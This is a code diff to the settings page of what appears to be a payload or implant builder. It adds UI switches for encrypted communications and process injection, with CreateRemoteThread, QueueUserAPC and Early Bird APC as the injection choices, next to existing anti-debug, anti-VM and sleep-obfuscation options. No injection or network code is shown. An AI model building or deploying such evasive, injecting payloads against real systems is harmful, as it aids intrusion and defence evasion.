@@ -51,6 +51,9 @@ const defaultConfig: PayloadConfig = {
   AntiDebug: true,
   AntiVM: true,
   SleepObfuscation: true,
+  EncryptedComms: true,
+  ProcessInjection: false,
+  InjectionMethod: 'none',
   EncryptionKey: '',
   CustomConfig: '',
 }
@@ -120,11 +123,14 @@ export function PayloadBuilderPage() {
     }
   }
 
-  const generateEncryptionKey = () => {
-    const key = Array.from(crypto.getRandomValues(new Uint8Array(32)))
+  const randomKey = () =>
+    Array.from(crypto.getRandomValues(new Uint8Array(32)))
       .map(b => b.toString(16).padStart(2, '0'))
       .join('')
-    setConfig(prev => ({ ...prev, EncryptionKey: key }))
+
+  const generateEncryptionKey = () => {
+    const key = randomKey()
+    setConfig(prev => ({ ...prev, EncryptedComms: true, EncryptionKey: key }))
     toast.success('Encryption key generated')
   }
 
@@ -381,9 +387,13 @@ export function PayloadBuilderPage() {
                         </div>
                       </div>
                       <Switch
-                        checked={!!config.EncryptionKey}
+                        checked={config.EncryptedComms}
                         onCheckedChange={(checked) => {
-                          if (!checked) setConfig(prev => ({ ...prev, EncryptionKey: '' }))
+                          setConfig(prev => ({
+                            ...prev,
+                            EncryptedComms: checked,
+                            EncryptionKey: checked ? (prev.EncryptionKey || randomKey()) : prev.EncryptionKey,
+                          }))
                         }}
                       />
                     </div>
@@ -396,10 +406,34 @@ export function PayloadBuilderPage() {
                         </div>
                       </div>
                       <Switch
-                        checked={false}
-                        onCheckedChange={() => {}}
+                        checked={config.ProcessInjection}
+                        onCheckedChange={(checked) => {
+                          setConfig(prev => ({
+                            ...prev,
+                            ProcessInjection: checked,
+                            InjectionMethod: checked ? (prev.InjectionMethod === 'none' ? 'crt' : prev.InjectionMethod) : 'none',
+                          }))
+                        }}
                       />
                     </div>
+                    {config.ProcessInjection && (
+                      <div className="pl-8 space-y-2">
+                        <Label>Injection Method</Label>
+                        <Select
+                          value={config.InjectionMethod || 'crt'}
+                          onValueChange={(v) => setConfig(prev => ({ ...prev, InjectionMethod: v, ProcessInjection: v !== 'none' }))}
+                        >
+                          <SelectTrigger>
+                            <SelectValue placeholder="Select method" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            <SelectItem value="crt">CreateRemoteThread</SelectItem>
+                            <SelectItem value="apc">QueueUserAPC</SelectItem>
+                            <SelectItem value="earlybird">Early Bird APC</SelectItem>
+                          </SelectContent>
+                        </Select>
+                      </div>
+                    )}
                   </div>
                 </div>
               </CardContent>
